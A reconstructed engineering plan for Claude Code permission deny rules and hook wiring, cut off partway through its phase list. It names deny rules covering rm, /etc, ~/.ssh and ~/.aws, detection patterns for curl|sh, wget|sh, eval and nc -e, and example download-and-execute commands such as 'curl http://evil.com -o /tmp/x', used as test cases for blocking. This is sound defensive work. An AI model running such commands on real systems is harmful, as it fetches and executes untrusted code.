---
type: plan
task_slug: permission-deny-and-hooks-wiring
status: phase-1-complete
phases_done: [1]
phases_pending: [2, 3, 4, 5, 6, 7, 8, 9]
created: 2026-07-17
reconstructed: 2026-07-17
tags: [harness-maker, plan, python, permissions, hooks, render, security]
research_doc: "[[RESEARCH-permission-deny-and-hooks-wiring]]"
interview_rounds: 5
adrs: 10
validator_outcome: MAJOR_REVISION_RESOLVED_UNREVALIDATED
summary: "Wire hooks into settings.json (staged), fix deny syntax + prune, add a consumption canary"
---

> # ⚠️ RECONSTRUCTED — NOT THE ORIGINAL
>
> The original PLAN, RESEARCH, and REVIEW were **destroyed on 2026-07-17** and are
> unrecoverable (never committed → existed only in `.worktrees/permission-deny-and-hooks-wiring/`
> → `task-land` deleted that worktree at wrapup).
>
> **Root cause:** `.gitignore` excluded `work-docs/` wholesale (added 2026-05-29 in
> `45538b26`, a `chore: re-render .claude` — apparently a side effect). gitignore only
> affects UNTRACKED files, so the 53 pre-existing deliverables kept committing normally
> and the contradiction stayed invisible, while **every deliverable created after
> 2026-05-29 was silently dropped** by wrapup's `git add … || true`. CLAUDE.md says the
> opposite in plain text: *"Deliverables (PLAN/REVIEW/RESEARCH/SPEC, human memory tiers)
> are deliberately NOT ignored — wrapup commits them."* Under the per-task worktree model
> that gap is data loss, not churn.
>
> Fixed in the same session: `work-docs/*` (contents, not the directory — git cannot
> re-include a file whose parent dir is excluded) + explicit negations, verified with
> `git check-ignore`.
>
> **This document is rewritten from the authoring session's context, not recovered.**
> Every ADR decision, the phase structure, and the review outcomes are reproduced from
> that transcript. Nuance that was in the original prose but not in the reconstructor's
> working memory is silently gone. Treat ADR *rationale* as faithful and ADR *wording* as
> approximate. Phase 1 is landed (`575c7bba`) — its code, tests, CHANGELOG entry, CLAUDE.md
> correction, and memory entries are all committed and are the authoritative record of
> what shipped. What this file uniquely carries is the **design for Phases 2-9**.

# PLAN — Permission deny syntax + hooks wiring

## 🎯 Executive Summary

**TL;DR — restore a hook subsystem that is dead *in Claude Code only*, then fix the
permission deny rules whose enforcement depends on it.**

Two defects, sequenced:

1. The rendered `.claude/hooks/hooks.json` is not a location Claude Code reads, so its
   hooks never fire there — telemetry, gates, loop control. They move to the `hooks` key
   of `.claude/settings.json`, staged non-blocking → blocking.
2. Three of the four `permissions.deny` rules use syntax that can never match. They are
   replaced, the health scorer that validated the *dead* syntax is realigned, and
   harness-shipped literals already on users' disks are pruned and rebuilt.

**Scope correction (Round 5).** The gate modules are **not** globally dead —
`.cursor/hooks.json` and `.codex/hooks.json` both wire `permission_gate`, `worktree_gate`,
and `spec_gate`, and Codex additionally routes `PermissionRequest`. Only the Claude Code
path is dead. The governing principle throughout: **preserve existing behavior everywhere;
opt-in applies only where a gate is newly introduced.**

**Why our tests missed it:** `RESEARCH-test-fidelity-gap` (2026-05-19) defined a 3-layer
model; `PLAN-test-fidelity-gap` ADR-001 shipped **Layer 1 only** and deferred Layers 2-3 to
follow-ups that never came. Layer 1 validates that an artifact *parses* — it cannot see
that a schema-perfect file sits where no consumer reads it. That RESEARCH names the class
outright (line 89): *"Unit test verified JSON shape — same shape Claude Code would accept.
Caught by Layer 3. Layer 1 cannot catch this — both fields are valid JSON."* Phase 9 adds
the minimal Layer-3 canary.

## 📚 Prior Work

- **[[RESEARCH-permission-deny-and-hooks-wiring]]** — the fact base (also reconstructed).
- **`[wiki:architecture] hooks-load-from-settings-not-hooksjson`** — the durable record of
  the premise + the `metrics.jsonl` evidence trap. Committed in `575c7bba`.
- **`[fail:design] namespace-prefix-mistaken-for-authorship`** — why ADR-008 has no delete
  path. Committed in `575c7bba`.
- **`[fail:test] assertion-pinned-defect-from-review-hint`** — how a reviewer hint, read
  backwards, pinned a defect. Committed in `575c7bba`.
- **`[wiki:pattern] loosening-a-security-default-needs-health-scorer-optout` (2026-05-31)** —
  precedent for Phase 5: changing a deny default without moving `readiness`' signals costs
  every install 35 points. This PLAN is the mirror image — changing deny *syntax* breaks
  `_DANGEROUS_DENY_PATTERNS`, which matches the substring `Write(/etc`.
- **Global memory, 2026-06-08 — "Absent-case = feature black hole"** — the pattern behind
  Phase 4: `sessionid_envfile_registered` / `autopilot_autoarm_registered` are written
  `(not hooks_path.exists()) or (…)`, so retiring the file makes them pass forever.
- **`[fail:test] integration-gated-test-stale-after-behavior-flip` (2026-06-01)** — why
  Phase 8 must run the `INTEGRATION=1` boundary suite.
- **`tests/cursor-compat/results-2026-05-08.md`** — established the Cursor-origin telemetry
  signature. Its unexamined half became CLAUDE.md's wrong claim.

## 🎙️ Interview Transcript

| # | Topic | Choice | Note | → ADR |
|---|---|---|---|---|
| 1 | Work unit + ordering | **one PLAN, hooks first** | Keeps Approach B available; docs corrected once | ADR-001 |
| 2 | Inert agent frontmatter | **delete + correct 8 doc surfaces** | The brief's author was misled by these with the docs open | ADR-002 |
| 3 | deny replacement | **B — PreToolUse delegation** | Docs-recommended; `permission_gate.py` already implements it | ADR-003 |
| 4 | Dead rules on disk | **fingerprint prune** | Template-only fix leaves the warning forever | ADR-004 |
| 5 | Old hooks file | **stop rendering + clean up** | No reader exists | ADR-005 |
| 6 | Rollout | **staged: non-blocking → control → blocking** | Blocking gates never ran in Claude Code | ADR-006 |
| 7 | Gate scope | **subordinate to `deny_dangerous`** | Prevents shipping unannounced blocking | ADR-007 |
| 8 | Recurrence prevention | **minimal canary in this PLAN** | Full Layer 3 stays a follow-up | ADR-009 |
| 9 | ADR-007 scope (validator MAJOR_REVISION) | **Claude PreToolUse path only** | Gate is live in Cursor+Codex; global subordination = security regression | ADR-007 rev |
| 10 | ADR-004 scope (validator MAJOR_REVISION) | **prune all harness-shipped literals** | Otherwise the installed base silently gets rejected Approach A | ADR-004 rev |
| 11 | ADR-005 mechanism (validator MAJOR_REVISION) | **exact match against pristine render** | `generated_by` does not exist in that file | ADR-005 rev |
| 12 | drift double-registration | **exclude from settings render** | Plugin owns `sessionstart_drift` | ADR-010 |
| 13 | ADR-008 mechanism (execute time) | **command-prefix, no sidecar** | `_normalize_hm_managed_command` already answers it | ADR-008 rev |
| 14 | Retire rule (REVIEW round 1) | **remove it from Phase 1 entirely** | Namespace ≠ authorship; and Phase 1 gains nothing from it | ADR-008 rev2 |

## 📐 Architecture Decision Records

### ADR-001: Single PLAN, hooks before deny
**Status:** Accepted (2026-07-17)
**Context:** Both defects touch `settings.json` and its render path, and the deny fix's
preferred approach depends on hooks being live in Claude Code.
**Decision:** One PLAN; hook wiring in Phases 1-4, the deny fix in Phases 5-6.
**Consequences:** ✅ Approach B stays available (impossible if deny ships first); ✅ the 8
doc surfaces are corrected once; ⚠️ the startup warning the user actually reported persists
until Phase 5.
**Rejected:** Split PLANs (forfeits B); deny first (mechanically forecloses B).

### ADR-002: Delete the inert `permissions:` frontmatter; correct the docs
**Status:** Accepted (2026-07-17)
**Context:** `permissions:` is not a recognized subagent frontmatter field
(`sub-agents.md`); the blocks are inert. CLAUDE.md:181-191 documented this on 2026-06-02
but left the templates and the rest of the docs untouched.
**Decision:** Remove the blocks from agent templates and the prose copies in
`*_body.md.j2`; correct all 8 doc surfaces from the "Write/Edit pairing invariant" to
"`Edit` only; frontmatter permissions are not enforced".
**Consequences:** ✅ removes a documented, recurring source of false security; ⚠️
`test_agent_body_partials._EXPECTED_SHA256` must be rebaselined.
**Rejected:** Annotate + keep (the blocks misled the incoming brief's author *with the docs
open*); shrink `tools:` (the executor genuinely needs Write/Edit/Bash).

### ADR-003: Delegate `curl|sh` to `permission_gate`; settings keeps only matchable rules
**Status:** Accepted (2026-07-17)
**Context:** `|` is a recognized command separator, so a rule spanning it never matches —
`Bash(curl * | sh)` is dead and fails *silently*. The docs call argument-constraining Bash
patterns fragile and recommend a PreToolUse hook. `gates/permission_gate.py` implements
exactly that, sourcing `_DANGER_PATTERNS` from `secscan.hook_injection`.
**Decision:** `deny_dangerous: true` renders
`["Bash(rm:*)", "Edit(/etc/**)", "Edit(~/.ssh/**)", "Edit(~/.aws/**)"]` — every rule
matchable, no startup warning. `curl|sh` / `wget|sh` / `eval` / `dd` / `nc -e` detection is
the gate's job. (`~/.aws` retained per CLAUDE.md §보안/권한; an earlier 3-rule draft dropped
it by transcription accident — caught by the validator.)
**Consequences:** ✅ no `curl`/`wget` friction; ✅ covers the reported bypasses (`o|sh` with
no space, `| bash`, `wget -O- | sh` all match `curl_pipe_sh`/`wget_pipe_sh`); ⚠️
Claude-side enforcement depends on a hook firing → hard-depends on Phase 3; ⚠️
`curl -o /tmp/x && sh /tmp/x` (two-step) is matched by neither — accepted, no rule shape
catches it either.
**Rejected:** A (broad `Bash(curl:*)`/`Bash(wget:*)`) — blocks all legitimate fetches;
A+B — inherits A's friction; C (drop network denies) — strictly weaker with B available.

### ADR-004 (revised): Prune every harness-shipped deny literal, dead or live
**Status:** Accepted (2026-07-17, revised at Interview #10 after validator MAJOR_REVISION)
**Context:** `_merge_permissions` unions deny lists to preserve user-added rules, so
literals harness-maker itself rendered are indistinguishable from user additions and survive
forever. **The first draft pruned only the 4 *dead* literals — not enough.**
`render.py:174-177` names `Bash(curl:*)` as a historical harness baseline literal, and it is
**live** (matchable). This repo proved it: `deny` held all 9 of `Bash(rm:*)`,
`Bash(curl * | sh)`, `Write(/etc/**)`, `Write(~/.ssh/**)`, `Bash(curl:*)`,
`Write(~/.aws/**)`, `Edit(/etc/**)`, `Edit(~/.ssh/**)`, `Edit(~/.aws/**)` while
`harness.yaml` had no `permissions` key at all. A dead-only prune leaves `Bash(curl:*)` →
the installed base keeps a blanket curl block → **exactly Approach A, which ADR-003
rejected** → and every Success Criterion still reads green.
**Decision:** `_merge_permissions` drops an append-only `_HARNESS_SHIPPED_DENY_LITERALS`
set — every deny literal harness-maker has ever rendered, dead **or** live (the 9 above).
Exact full-string match only. The current template then re-adds whatever `deny_dangerous`
warrants, so the list is rebuilt from policy each render instead of accreting history.
**Consequences:** ✅ the warning clears **and** the installed base gets ADR-003's promised
behavior; ✅ `deny_dangerous` becomes the single honest answer — settings and gate agree;
⚠️ **removes live protection a user may believe is theirs** (a hand-typed byte-identical
`Edit(/etc/**)` is lost unless `deny_dangerous: true` re-adds it); ⚠️ **`deny_dangerous: true`
users are NOT made whole** — the prune removes 9 and the template re-adds 4; the delta
includes the live `Bash(curl:*)`, so an opted-in user **loses blanket curl blocking**
(`curl http://evil.com -o /tmp/x` is blocked today and will not be). Intentional — it is
Approach A, which ADR-003 rejected — but it is a real reduction in an opted-in tier and must
not be buried; ⚠️ the literal set is append-only history, never recycle an entry.
**Rejected:** Dead-only prune (silently ships rejected Approach A while every criterion
reads green); health finding + acceptance (leaves the friction for anyone not running health).

### ADR-005 (revised): Retire `.claude/hooks/hooks.json`; delete only on exact pristine match
**Status:** Accepted (2026-07-17, revised at Interview #11 after validator MAJOR_REVISION)
**Context:** Neither IDE reads it. **The first draft gated deletion on `generated_by`
provenance — which does not exist**: `templates/hooks/hooks.json.j2` emits only `hooks` and
`preset` (provenance deliberately sacrificed for this file, `render.py:15`), so the gate was
unimplementable. Worse, `render.py:745-747` records the **merged** file's hash in the render
manifest and `reconcile.py:563-565` classifies a manifest-matching file as `ours-clean` — so
once the FileSpec is removed, the orphan sweep would delete a `hooks.json` **containing
user-authored hooks**. Data loss. (Found by codex at P0.)
**Decision:** Drop the `hooks/hooks.json` FileSpec. Delete the stale file **only when its
bytes exactly match what the current template would render** (⇒ it holds no user content);
otherwise preserve it and warn once. Explicitly exclude the path from the orphan-sweep
`ours-clean` path so the manifest's merged-hash entry can never authorize deletion. Realign
all four `readiness` hook signals to settings.json; retarget `test_boundary_hooks_json.py`
+ the e2e fixtures.
**Consequences:** ✅ one source of truth per IDE; ✅ preserve-biased, matching the existing
branch content-gate pattern; ✅ closes a P0 data-loss path Phase 4 would otherwise open;
⚠️ a user who edited the file keeps a stale, unread artifact — accepted, the warn names it.
**Rejected:** `generated_by` gate (the field does not exist); migrate user entries into
settings.json first (zero-loss but needs one-shot migration code + schema matching — the
exact-match gate reaches the same safety with far less machinery); keep rendering it
deprecated (two definitions drift — the pattern that caused this).

### ADR-006 (revised): Staged rollout — inventory re-derived from the template
**Status:** Accepted (2026-07-17, revised after validator MAJOR_REVISION)
**Context:** Hooks in the Claude template have effectively never executed **in Claude
Code**. Three can **block tool calls**. **The first draft's inventory was wrong**: it said
"9 hooks" and omitted `autopilot_autoarm` (`hooks.json.j2:79`), an error inherited unexamined
from RESEARCH. A grep of the template yields **11 distinct modules**.
**Decision:** Inventory is re-derived from `hooks.json.j2`, not from prose. Of the 11,
`sessionstart_drift` is excluded (ADR-010), leaving **10 rendered into settings.json**:
- **Stage 1 — non-blocking (5):** `telemetry`, `post_write_reminder`, `sessionid_envfile`,
  `autopilot_autoarm`, `flush_session` — **LANDED (Phase 1, `575c7bba`)**
- **Stage 2 — control-flow (2):** `loop_gate`, `autopilot_guard`
- **Stage 3 — blocking (3):** `permission_gate`, `worktree_gate`, `spec_gate` (the last
  still `dev_mode == "spec-driven"`-gated)

Each stage is verified in live use before the next.
**Consequences:** ✅ a failure is attributable to one stage; ✅ Stage 1 delivers telemetry +
`HM_SESSION_ID` + autopilot persistence; ⚠️ deny enforcement on the Claude side waits for
Stage 3.
**Rejected:** All at once — no attribution when several latent bugs fire together.

### ADR-007 (revised): Subordinate `permission_gate` to `deny_dangerous` — Claude PreToolUse only
**Status:** Accepted (2026-07-17, revised at Interview #9 after validator MAJOR_REVISION)
**Context:** `permission_gate.py:9-10` declares itself unconditional. **The first draft
subordinated it globally — that premise was false.** The gate is dead only in Claude Code:
`templates/codex/hooks.json.j2:26,39` wires it to Codex `PreToolUse` + `PermissionRequest`,
and `templates/cursor/hooks.json.j2` wires it (plus `spec_gate` and `worktree_gate`) for
Cursor. Since `deny_dangerous` defaults to **False**, a global subordination would **disable
existing Cursor and Codex blocking by default** — a security regression — and break the
pinned contract at `tests/unit/test_codex_phase5.py:169-179,195-205`. Meanwhile leaving it
unconditional on the *newly wired* Claude path would ship blocking (including the very broad
`\beval\s+`) to every Claude user, against the settled 2026-05-31 solo-friendly opt-out.
**Decision:** Governing principle — **preserve existing behavior everywhere; the opt-out
applies only where the gate is newly introduced.**

**Mechanism.** Consumers are **not** distinguishable at runtime: `permission_gate.py:94-103`
reads only `hook_event_name`, `tool_name`, `tool_input` — there is no consumer field — and
Codex sends the byte-identical `hook_event_name: "PreToolUse"`
(`tests/codex-compat/hook_pre_tool_use_allow.json:2`). Branching on
`hook_event_name == "PreToolUse"` would subordinate **Codex too** — the exact regression this
ADR exists to prevent. *(An earlier draft asserted a discriminator without verifying it; both
the main loop and the validator caught it independently.)*

Distinguish at the **producer**, at render time: the **Claude template only**
(`templates/hooks/hooks.json.j2` → now `templates/settings/*.j2`) invokes the gate with an
explicit flag — `python -m harness_maker.gates.permission_gate --subordinate-to-deny-dangerous`.
The Cursor and Codex templates' invocations stay **byte-unchanged**, and are therefore
provably unregressed. Only the flagged path reads `harness.yaml permissions.deny_dangerous`;
the read must be cheap and **fail closed to today's behavior** (unreadable `harness.yaml` ⇒
block). Flag absent ⇒ unconditional, today's behavior — which is also what
`test_codex_phase5.py:183-204` exercises (those cases pass no `hook_event_name` at all, so
the flag-absent default must decide them). This is the codebase's established pattern for the
same problem (`loop_gate --mode stop-hook`, `worktree create --claude-session-id`).
**Consequences:** ✅ zero regression for Cursor/Codex; `test_codex_phase5`'s contract holds;
✅ wiring Claude hooks ships no unannounced blocking; ⚠️ **one gate, two behaviors keyed by
consumer** — a real complexity cost, must be documented in CLAUDE.md §보안/권한 and in the
module docstring (whose "no project should need to opt out" line becomes wrong); ⚠️ the
Claude path gains a `harness.yaml` read on a hot path → cheap + fail-safe.
**Rejected:** Global subordination (disables live Cursor/Codex protection by default; breaks
a pinned test); withdraw ADR-007 (ships blocking to every Claude user unannounced); a
separate `gate_dangerous` flag (a third axis to interview, document, and migrate for no gain).

### ADR-008 (revised ×2): settings.json `hooks` is deep-merged; NO delete path
**Status:** Accepted (2026-07-17, revised at execute time, then again at REVIEW round 1)
**Context:** Moving hooks into `settings.json` puts them in a file users edit. A shallow
replace would wipe user-authored hooks (CLAUDE.md checklist §1).

**Retirement is DEFERRED out of Phase 1 entirely.** Three mechanisms were tried:
- A **sidecar** fingerprint store — the validator showed it would collide Claude↔Codex
  identities (same nested schema + event names) and be per-machine (gitignored ⇒ a fresh
  clone never reaps).
- The **`<HM>:`-prefix** rule then **deleted user hooks**: `<HM>:` marks our *namespace*,
  not our *authorship*. ADR-006 deliberately does not ship `loop_gate` / `autopilot_guard` /
  `permission_gate` / `worktree_gate` / `spec_gate` at Stage 1, so a user who hand-wires one
  would have it silently deleted — **the staged rollout itself creates the victim
  population**. (security-reviewer P1; codex raised the same defect at P2 from the
  forgeable-prefix angle — the tier split meant they could not form consensus.)
- **And the rule bought nothing.** Retirement only matters once a template STOPS shipping
  something. No Phase-1 template does. Benefit 0, cost = silent deletion from a user's config.

**Decision:** Phase 1 ships deep-merge with **no delete path at all**. Preservation is the
invariant, pinned by `test_merge_never_deletes_a_hook_in_our_namespace_that_we_do_not_ship`.
When retirement is genuinely needed (Phase 3's `dev_mode` flip retiring `spec_gate`),
implement it on **positive provenance** — a prior-render manifest proving *we* wrote that
entry — never a command-prefix inference.

Two mechanisms DO ship:
- **All-commands identity** (`_entry_identity` keys on every command in a matcher group,
  joined by `_IDENT_CMD_SEP`): a group holds N commands (SessionStart carries 2). The
  first-command-only key made a group whose later commands differed look already-shipped, so
  it was replaced wholesale — taking any user command inside it along.
- **`_strip_shipped_commands`** (REVIEW round 1, consensus-passed P1 — codex +
  code-reviewer): all-commands identity means a mixed group `[our_cmd, user_cmd]` no longer
  matches the shipped `[our_cmd]`, so it is preserved — and appending it verbatim beside the
  shipped group registers `our_cmd` **twice**, firing the hook twice. Same class as the
  2026-05-28 spoton triplication, reachable because Claude Code's `/hooks` UI appends into an
  existing matcher group. A preserved mixed group keeps the user's commands and drops only
  those the template already ships for that event.
**Consequences:** ✅ user hooks survive — including a hook in *our* namespace they wired
themselves, and their own command appended inside one of our matcher groups; ✅ no command
registered twice; ✅ zero persisted state — no sidecar, no absent-case, no Claude↔Codex
collision; ⚠️ a harness hook dropped from a template lingers until the provenance-based
retire lands (Phase 3) — accepted, nothing drops one yet; ⚠️ `_merge_hooks_json` /
`_entry_identity` / `_strip_shipped_commands` are shared by `.cursor/hooks.json` (flat) and
`.codex/hooks.json` (nested) — regression-tested for both.
**Rejected:** Sidecar store; `<HM>:`-prefix retire; shallow replace; preserve the mixed group
verbatim (duplicates our command).

### ADR-009: One consumption canary — assert a hook actually fires
**Status:** Accepted (2026-07-17)
**Context:** Every check in the chain is **self-referential**.
`test_boundary_hooks_json.py` claims to run output through "the consumer parser", but
`parse_claude_hooks_json` is *our own* helper (`_boundary_helpers.py:127`) encoding *our own
belief*; it asserts `path.is_file()` at `.claude/hooks/hooks.json` — pinning the wrong
location as correct. `readiness._DANGEROUS_DENY_PATTERNS` matches `"Write(/etc"`, so the
health scorer independently *rewards* the dead syntax; `test_permissions_deny_optout.py:36`
pinned `Bash(curl * | sh)` as a third confirmation. The e2e metrics group **seeds**
`metrics.jsonl` rather than observing hooks produce it. `test_plugin_live.py` runs the real
`claude` binary but only inspects `/harness-maker:make` outputs. Three independent
"validators" encoded one wrong belief and confirmed each other — all green.
**Decision:** One `INTEGRATION=1`-gated canary that runs the real `claude` binary against
`tests/e2e/sandbox-plugin-test/` and asserts a hook side effect only Claude Code can
produce: a new `event: "post_tool_use"` entry read through **`_metrics_io`** (the
date-sharded `metrics-YYYY-MM-DD.jsonl` — never the legacy `metrics.jsonl`, never a
hardcoded date). The oracle is observed behavior, not our belief. Full Layer 3 stays a
follow-up PLAN.
**Consequences:** ✅ closes this bug class — invisible to Layer 1 by construction, visible
here by construction; ⚠️ skipped without the `claude` binary → **a SKIP does not discharge
the criterion**; ⚠️ one canary ≠ Layer 3 — only telemetry is observed.
**Rejected:** Full Layer 3 now (doubles the PLAN); separate PLAN (exactly what ADR-001 said
in 2026-05-19 — two months produced nothing; declining to repeat the pattern that caused
this); fix the polluted tests only (no external oracle → the next belief-level error ships
the same way).

### ADR-010: Exclude `sessionstart_drift` from the settings render
**Status:** Accepted (2026-07-17)
**Context:** `sessionstart_drift` is the one hook already alive in Claude Code — the
**plugin bundle** ships it (`hooks/hooks.json` at plugin root, the one legitimate
`hooks/hooks.json` location). Adding it to `settings.json` too registers it twice for plugin
users.
**Decision:** Render the other 10 into `settings.json`; leave `sessionstart_drift` to the
plugin bundle.
**Consequences:** ✅ no double-fire; Stage-1 anomalies stay attributable; ⚠️ a user who
renders a harness **without** the plugin gets no drift detection at all. **Such users
demonstrably exist** — `hooks/hooks.json:9` invokes drift via `uv run --with
${CLAUDE_PLUGIN_ROOT}` (plugin installs only), and CLAUDE.md §릴리스 절차 records PyPI
publishing since 0.15.3. **Accepted, with the gap stated** — drift is already dead in
`.claude/hooks/hooks.json` today, so this declines to fix rather than regresses. *(An earlier
draft rejected the in-hook guard because the case had "no evidence" — the evidence was in our
own release docs. Settled by reading them.)* ✅ Verified non-conflict: no `readiness` signal
references `sessionstart_drift`.
**Rejected:** Render it anyway and accept double-fire; add an in-hook "already ran this
session" guard — it *would* cover the PyPI gap too; rejected for scope, not for lack of a use
case. Revisit if PyPI installs matter.

## 🏗️ Technical Design

### Current State (post-Phase-1)

| Element | Location | Status |
|---|---|---|
| Claude Stage-1 hooks | `templates/settings/*.j2` → `.claude/settings.json` `hooks` | ✅ **LANDED** (5 of 10) |
| Claude Stage-2/3 hooks | not rendered | Phases 2-3 |
| Claude hook definitions (legacy) | `templates/hooks/hooks.json.j2` → `.claude/hooks/hooks.json` | still rendered, **never read** — Phase 4 retires |
| Plugin hooks | `hooks/hooks.json` (plugin root) | **live** — `sessionstart_drift` only |
| Cursor hooks | `.cursor/hooks.json` | **live** — incl. permission/spec/worktree gates |
| Codex hooks | `.codex/hooks.json` | **live** — incl. `permission_gate` on PermissionRequest |
| Settings deny | `templates/settings/*.j2` | 3 of 4 rules dead — Phase 5 |
| Health scorer | `readiness.py:62` | matches the **dead** syntax — Phase 5 |
| Readiness hook signals | `readiness.py:476,485,500,542` | read the dead file; 2 of 4 **fail open** — Phase 4 |
| Permission merge | `render.py` `_merge_permissions` | unions → harness literals immortal — Phase 6 |
| Gate | `gates/permission_gate.py` | implemented; **live for Cursor/Codex, dead for Claude** |
| Agent permissions | `templates/agents/*.md.j2` frontmatter | inert — Phase 7 |

### Architecture

```
harness.yaml permissions.deny_dangerous   ← single policy axis
        │
        ├─→ settings/*.json.j2 → deny = [Bash(rm:*), Edit(/etc/**), Edit(~/.ssh/**), Edit(~/.aws/**)]
        │                         (rebuilt from policy; ADR-004 prunes accreted history first)
        └─→ permission_gate
              ├─ Claude PreToolUse ....... --subordinate-to-deny-dangerous flag (ADR-007)
              ├─ Cursor preToolUse ....... unconditional (unchanged)
              └─ Codex PreToolUse/PermissionRequest ... unconditional (unchanged)

templates/settings/*.j2 ──(Phases 1-3, staged, 10 of 11)──→ .claude/settings.json "hooks"
                                                             ↑ _merge_hooks_json + _strip_shipped_commands
sessionstart_drift ──→ stays in the plugin bundle only                            (ADR-010)
.claude/hooks/hooks.json ──(Phase 4)──→ deleted iff pristine                      (ADR-005)
```

### API Changes

No public Python API change. **Contract changes:** `.claude/settings.json` gains a
harness-owned `hooks` key (**shipped**); `.claude/hooks/hooks.json` is retired (Phase 4).
`harness.yaml` schema unchanged (`deny_dangerous` already exists) → **no `schema_version` bump**.

## 📝 Implementation Plan

### Phase 1 — Hooks into settings.json + Stage-1 (non-blocking)
- **Status: DONE** — landed in `575c7bba` (2026-07-17).
- Shipped: `_SETTINGS_KEYS_OWNED_BY_HARNESS += "hooks"`; `_entry_identity` all-commands
  (`_IDENT_CMD_SEP`); `_strip_shipped_commands`; hooks deep-merge in
  `_shallow_merge_existing_json`; both settings templates emit the 5 Stage-1 modules, with
  `'{{ harness_maker_src_path }}'` quoted (word-splitting on spaced install paths, WSL2).
  **No retire path** (ADR-008 rev2).
- Tests: `tests/unit/test_render_settings_hooks.py` (21). Full suite GREEN; ruff/format/mypy
  clean; 8 snapshots regenerated (each diff exactly one `settings.json body_sha256`).
- REVIEW: Grade A / APPROVED after 3 rounds, `human_review_needed: true` (2 pre-existing
  manual-only P1s, both out of Phase 1's scope).
- **Premise CONFIRMED empirically** before implementation: hand-add `telemetry` +
  `sessionid_envfile` to this repo's `.claude/settings.json`, open a **new** session → both
  `metrics-2026-07-17.jsonl` and `HM_SESSION_ID=9aef3a94-…` flipped from a recorded
  baseline. Rival hypothesis "the command is broken, not mislocated" refuted separately
  (piping a payload into the exact rendered command exits 0 and writes the file).
- **Open:** the shipped renderer's own end-to-end proof needs a **release** —
  `/harness-maker:make --update` renders from the **plugin cache (0.39.0)**, not this branch.

### Phase 2 — Stage-2 hooks (control-flow)
- **depends_on:** `[1]` ✅ satisfied
- **parallel_group:** `serial-hooks`
- **merge_hazards:** `templates/settings/*.j2` — every hooks/deny phase touches these.
  Serial with 3-6.
- **Scope in:** add `loop_gate` (Stop) + `autopilot_guard` (PreToolUse + Stop) to the
  rendered `hooks` in both settings templates; extend
  `tests/unit/test_render_settings_hooks.py`'s `STAGE1_MODULES` / `LATER_STAGE_MODULES`
  partition to move these two across; regenerate the 8 snapshots.
- **Scope out:** blocking gates (Phase 3); `permission_gate`'s `--subordinate-to-deny-dangerous`
  flag (Phase 3, atomic with its wiring).
- **Exit criterion:** `uv run pytest tests/unit tests/structural -q` green; **and a live
  check in a NEW session** — `/hm:loop` reaches iteration 2 (proves the Stop hook can block),
  and `$HM_SESSION_ID` is non-empty. The live half cannot be discharged in the authoring
  session: settings are read at session start.
- **Risk:** medium — `loop_gate` changes Stop semantics for the first time in Claude Code.
- **Rollback:** revert the Phase 2 commit; Phase 1 stands.

### Phase 3 — Stage-3 hooks (blocking gates) + gate subordination (ADR-007)
- **depends_on:** `[2]`
- **parallel_group:** `serial-hooks`
- **merge_hazards:** settings templates; `gates/permission_gate.py`.
- **Scope in:** add `permission_gate`, `worktree_gate`, `spec_gate` **and, in the same
  commit**, the ADR-007 Claude-path subordination (`--subordinate-to-deny-dangerous` rendered
  only by the Claude template) + the corrected module docstring. Deferring subordination to a
  later phase means `deny_dangerous: false` users **are** blocked in between — it must be
  atomic with the wiring.
- **Scope out:** deny template/readiness changes (Phase 5).
- **Exit criterion:** full `uv run pytest -q` green (incl. `test_codex_phase5` **unmodified**);
  with `deny_dangerous: false`, a live Claude session runs `sh -c 'curl http://x | sh'`
  **unblocked** while the Codex `PermissionRequest` **and** `PreToolUse` paths still deny it;
  with `deny_dangerous: true`, Claude blocks it; a normal `Write` inside the task worktree is
  **not** blocked (negative control — `worktree_gate` false-positives are the acute risk).
- **Risk:** **high** — three never-executed gates can block ordinary tool calls, and the gate
  now branches on consumer.
- **Rollback:** revert the Phase 3 commit; Phases 1-2 stand.

### Phase 4 — Retire `.claude/hooks/hooks.json` (ADR-005)
- **depends_on:** `[3, 7]` — 7 included so the agent-fixture regeneration happens once.
- **parallel_group:** `serial-hooks`
- **merge_hazards:** `synthesize.py` FileSpec list; `readiness.py` guardrails (Phase 5 also
  edits this function — serial); e2e fixtures (shared with Phase 7).
- **Scope in:** drop the FileSpec; `cli.py` deletes the stale file **iff its bytes exactly
  match a pristine render**, else preserve + warn once; exclude the path from `reconcile`'s
  orphan-sweep `ours-clean` path; retarget **all four** readiness signals to settings.json —
  `hooks_json_present` (`:476`), `hooks_defined` (`:485`), `sessionid_envfile_registered`
  (`:500`), `autopilot_autoarm_registered` (`:542`) — and **re-derive each one's absent-case**:
  the latter two are written `(not hooks_path.exists()) or (…)`, so retiring the file makes
  them pass forever (2026-06-08 "absent-case = feature black hole"); retarget
  `tests/integration/test_boundary_hooks_json.py`; update the additional pinning sites —
  `tests/unit/test_preservation_matrix.py:84-97`, `tests/unit/test_render.py:1700-1812`,
  `tests/unit/test_readiness.py:162`, `tests/unit/test_readiness_autoarm_hook.py:69`,
  `tests/unit/test_readiness_sessionid_hook.py:59`, `tests/cursor-compat/README.md:15`,
  `tests/cursor-compat/MANUAL_CHECKLIST.md:77,220-227`; regenerate
  `tests/e2e/sandbox-plugin-test/**` once.
- **Scope out:** `.cursor/hooks.json`, `.codex/hooks.json`, plugin-root `hooks/hooks.json`.
- **Exit criterion:** `uv run pytest -q` green; a fresh render produces no
  `.claude/hooks/hooks.json`; **negative controls, not a score check** — a rendered
  `settings.json` with the SessionStart hook removed **FAILS** `sessionid_envfile_registered`,
  and one missing `autopilot_autoarm` **FAILS** `autopilot_autoarm_registered`; a user-edited
  `hooks.json` survives the cleanup with a warning.
- **Risk:** medium — deletes a file from user projects (exact-match gated).
- **Rollback:** revert the Phase 4 commit.

### Phase 5 — Deny syntax + readiness realign
- **depends_on:** `[3]`
- **parallel_group:** `serial-hooks`
- **merge_hazards:** `templates/settings/*.j2` (Phases 1-3); `readiness.py` guardrails (Phase 4).
- **Scope in:** both settings templates →
  `["Bash(rm:*)", "Edit(/etc/**)", "Edit(~/.ssh/**)", "Edit(~/.aws/**)"]`; `readiness.py:62`
  `_DANGEROUS_DENY_PATTERNS` → `["rm", "Edit(/etc", "Edit(~/.ssh", "Edit(~/.aws"]` with the
  threshold **re-derived from the new list length** (the current `>= 3` against a 4-item list
  must not be copied blindly onto a shorter list, where it silently becomes "all required");
  fix the stale `render.py:174-177` comment.
- **Scope out:** the disk prune (Phase 6); gate subordination (Phase 3).
- **Exit criterion (render-level — the no-warning check belongs to Phase 6):**
  `uv run pytest -q` green; `INTEGRATION=1 uv run pytest tests/integration/test_boundary_*.py`
